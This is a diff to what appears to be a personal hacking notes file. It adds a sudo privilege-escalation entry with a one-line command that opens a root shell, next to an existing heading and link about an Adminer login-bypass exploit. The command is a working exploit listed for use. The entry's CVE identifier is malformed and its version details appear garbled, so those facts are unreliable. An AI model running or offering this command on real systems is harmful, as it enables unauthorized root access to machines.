@@ -1,5 +1,7 @@
 # Notes
 
+### CVE-2019-10-15 Sudo < 1.2.28 Privilege Escalation
+``sudo -u#-1 /bin/bash``
 
 ### Adminer Database Management Tool Exploit Bypass Login
 https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
